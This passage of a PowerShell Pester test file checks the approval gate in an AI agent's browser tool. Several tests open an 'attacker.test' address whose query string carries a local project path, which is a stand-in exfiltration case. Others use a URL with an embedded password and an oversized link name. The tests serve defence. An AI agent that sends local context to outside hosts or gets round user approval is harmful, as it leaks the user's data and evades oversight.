            Should -Invoke Invoke-DpBrowserRequest -Times 0 -Exactly
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
        }

        It 'does not echo a secret from the address back to the model' {
            $result = Invoke-DpBrowserTool -Action open -Url 'https://user:hunter2@weathercity.com/'
            $result | Should -Not -Match 'hunter2'
        }
    }

    Context 'leaving the site' {
        It 'asks before opening an off-scope address' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/?ctx=D%3A%5CGit%5CDeskPilot'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 1
        }

        It 'shows the whole address, including the part after the question mark' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/?ctx=D%3A%5CGit%5CDeskPilot'
            $asked = $global:DeskPilotBrowserBridge.Asked[0] | ConvertFrom-Json
            $asked.summary.url | Should -Match 'ctx='
            $asked.summary.host | Should -Be 'attacker.test'
            $asked.class | Should -Be 'BrowserNavigation'
        }

        It 'does not navigate when the user declines' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $global:DeskPilotBrowserBridge = New-DpFakeBridge -Decision 'deny' -Note 'not that site'

            $result = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/' | ConvertFrom-Json
            $result.ok | Should -BeFalse
            $result.error | Should -Match 'not that site'
            Should -Invoke Invoke-DpBrowserRequest -ParameterFilter { $Command -eq 'navigate' } -Times 1 -Exactly
        }

        It 'widens the scope only after the user approves' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/'
            $global:DeskPilotBrowserState.granted | Should -Contain 'attacker.test'
        }

        # An answer that does not carry this navigation's fingerprint could be a
        # stale card from an earlier Turn, so it is treated as a denial.
        It 'refuses an approval that does not match this navigation' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $global:DeskPilotBrowserBridge = New-DpFakeBridge -WrongFingerprint

            $result = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/' | ConvertFrom-Json
            $result.ok | Should -BeFalse
            $result.error | Should -Match 'did not match'
            $global:DeskPilotBrowserState.granted | Should -Not -Contain 'attacker.test'
        }

        It 'denies rather than proceeding when nobody answers' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $global:DeskPilotBrowserBridge = New-DpFakeBridge -TimeOut

            $result = Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/' | ConvertFrom-Json
            $result.ok | Should -BeFalse
            $result.error | Should -Match 'approved'
        }

        It 'refuses when there is no way to ask' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $global:DeskPilotBrowserBridge = New-DpFakeBridge -Disabled

            (Invoke-DpBrowserTool -Action open -Url 'https://attacker.test/' | ConvertFrom-Json).ok | Should -BeFalse
        }

        It 'asks again for the next new host rather than reusing the grant' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://first.test/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://second.test/'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 2
        }
    }

    Context 'a project that added domains' {
        It 'does not ask for a host the project already allows' {
            $global:DeskPilotBrowserContext.projectDomains = @('partner.test')
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $null = Invoke-DpBrowserTool -Action open -Url 'https://partner.test/page'
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
        }
    }

    Context 'what the page tried to do' {
        It 'reports refusals the supervisor made on its own' {
            Mock Invoke-DpBrowserRequest {
                @{ ok = $true; result = (New-DpFakePage) }
            }
            Mock Start-DpBrowserSession {
                $events = [System.Collections.Generic.List[object]]::new()
                $events.Add([pscustomobject]@{ event = 'blocked'; reason = 'resource'; url = 'https://attacker.test/t.js' })
                @{ process = $null; faulted = $false; scope = @($Scope); events = $events }
            }

            $result = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/' | ConvertFrom-Json
            $result.blocked[0].reason | Should -Be 'resource'
        }
    }

    Context 'using the tool out of order' {
        It 'refuses <Action> before any page is open' -TestCases @(
            @{ Action = 'read_page' }, @{ Action = 'screenshot' }, @{ Action = 'click_link' }
        ) {
            param($Action)
            $result = Invoke-DpBrowserTool -Action $Action -LinkText 'Chile' | ConvertFrom-Json
            $result.ok | Should -BeFalse
            Should -Invoke Invoke-DpBrowserRequest -Times 0 -Exactly
        }

        It 'refuses an open with no address' {
            (Invoke-DpBrowserTool -Action open -Url '' | ConvertFrom-Json).ok | Should -BeFalse
        }

        It 'refuses a link name long enough to be a payload' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            (Invoke-DpBrowserTool -Action click_link -LinkText ('a' * 500) | ConvertFrom-Json).ok | Should -BeFalse
        }

        It 'refuses an action it does not offer' {
            { Invoke-DpBrowserTool -Action 'submit_form' } | Should -Throw
        }
    }
}





